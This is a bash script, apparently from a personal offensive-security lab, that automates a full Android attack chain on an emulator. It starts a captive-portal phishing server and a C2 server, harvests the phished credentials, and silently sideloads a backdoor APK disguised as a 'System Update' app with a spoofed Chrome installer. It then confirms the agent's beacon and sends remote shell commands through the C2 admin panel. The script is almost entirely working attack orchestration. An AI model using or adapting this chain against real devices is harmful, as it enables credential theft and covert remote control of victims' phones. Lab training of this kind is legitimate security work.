#!/bin/bash
# OffSec Lab - Full Chain Hybrid MITM + C2 Simulation
# Rogue AP → Captive Portal Phishing → APK Sideload → C2 Backdoor

set -e

LAB_DIR="/home/h3llo/Documents/0x-lab/Mobile-Pentest/hybrid-mitm-c2"
APK_SRC="$LAB_DIR/c2-lab-agent.apk"
EMU="emulator-5554"

echo "╔══════════════════════════════════════════════════════════╗"
echo "║   OFFENSEC LAB - HYBRID MITM + C2 FULL CHAIN           ║"
echo "║   Rogue AP → Phishing → APK Download → C2 Backdoor    ║"
echo "╚══════════════════════════════════════════════════════════╝"

# ============================================================
# STEP 0: Cleanup & Preparation
# ============================================================
echo ""
echo "[*] Step 0: Cleaning previous state..."
# Kill old server
kill 96594 2>/dev/null || true
adb -s $EMU uninstall com.c2.agent 2>/dev/null || true
adb -s $EMU shell rm -f /data/local/tmp/c2agent.apk 2>/dev/null || true
echo "[+] Clean OK"

# ============================================================
# STEP 1: Start C2 + Captive Portal Server
# ============================================================
echo ""
echo "[*] Step 1: Starting C2 + Captive Portal server..."
python3 "$LAB_DIR/c2_server.py" > /tmp/c2_server.log 2>&1 &
SERVER_PID=$!
sleep 2

# Verify server is running
if kill -0 $SERVER_PID 2>/dev/null; then
    echo "[+] Server running (PID: $SERVER_PID)"
    curl -s -o /dev/null -w "    Captive Portal :8080 → HTTP %{http_code}\n" http://127.0.0.1:8080/
    curl -s -o /dev/null -w "    C2 Server :4443      → HTTP %{http_code}\n" http://127.0.0.1:4443/admin
else
    echo "[!] Server failed to start!"
    exit 1
fi

# ============================================================
# STEP 2: Phase 1 - Captive Portal & Credential Theft (Maestro)
# ============================================================
echo ""
echo "[*] Step 2: Captive Portal Attack via Maestro..."
echo "    Opening phishing page, capturing credentials..."
maestro test "$LAB_DIR/attack-phase1-portal.yaml" 2>&1 | grep -E "COMPLETED|FAILED|ERROR"

echo ""
echo "    Credentials stored on server:"
curl -s http://127.0.0.1:8080/creds | grep -oP 'Captured Credentials \(\K[^)]*'

# ============================================================
# STEP 3: APK Installation (silent via ADB)
# ============================================================
echo ""
echo "[*] Step 3: Installing APK on emulator..."
adb -s $EMU push "$APK_SRC" /data/local/tmp/c2agent.apk > /dev/null
INSTALL_RESULT=$(adb -s $EMU shell cmd package install -i "com.android.chrome" -t -r /data/local/tmp/c2agent.apk 2>&1)
echo "    Install result: $INSTALL_RESULT"

# Verify installation
adb -s $EMU shell pm list packages | grep com.c2.agent > /dev/null
echo "[+] APK installed successfully"

# ============================================================
# STEP 4: Phase 2 - C2 Agent Activation (Maestro)
# ============================================================
echo ""
echo "[*] Step 4: Activating C2 Agent via Maestro..."
echo "    Launching System Update app, starting C2 beacon..."
maestro test "$LAB_DIR/attack-phase2-agent.yaml" 2>&1 | grep -E "COMPLETED|FAILED|ERROR"

# ============================================================
# STEP 5: Verify C2 Communication
# ============================================================
echo ""
echo "[*] Step 5: Verifying C2 beacon..."
sleep 15  # Wait for beacon

echo ""
echo "    Connected agents:"
curl -s http://127.0.0.1:4443/admin | grep -oP '<tr><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td></tr>' | while read line; do
    id=$(echo "$line" | sed 's/<[^>]*>//g' | awk '{print $1}')
    dev=$(echo "$line" | sed 's/<[^>]*>//g' | awk '{print $2}')
    ver=$(echo "$line" | sed 's/<[^>]*>//g' | awk '{print $3}')
    echo "    → Agent: ${id:0:16}... | Device: $dev | Android: $ver"
done

# ============================================================
# STEP 6: Send Command to Agent
# ============================================================
echo ""
echo "[*] Step 6: Remote command execution..."
AGENT_ID=$(curl -s http://127.0.0.1:4443/admin | grep -oP 'value="[^"]{16}"' | head -1 | cut -d'"' -f2)

if [ -n "$AGENT_ID" ]; then
    echo "    Sending 'shell:id' to agent: ${AGENT_ID}..."
    curl -s "http://127.0.0.1:4443/admin?target=${AGENT_ID}&cmd=shell:id" > /dev/null
    sleep 5  # Wait for result
    echo ""
    echo "    Command result:"
    curl -s http://127.0.0.1:4443/admin | grep -oP '<div class="result"><b>\[[^\]]*\]</b> \K[^<]*'
    echo ""
fi

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  SIMULATION COMPLETE                                    ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "  Access Points:"
echo "    Admin Panel:   http://10.0.2.2:4443/admin"
echo "    Stolen Creds:  http://10.0.2.2:8080/creds"
echo "    Captive Portal: http://10.0.2.2:8080/"
echo ""
echo "  To send commands:"
echo "    curl \"http://127.0.0.1:4443/admin?target=${AGENT_ID}&cmd=shell:ls\""
echo ""
echo "  Server logs:"
echo "    tail -f /tmp/c2_server.log"
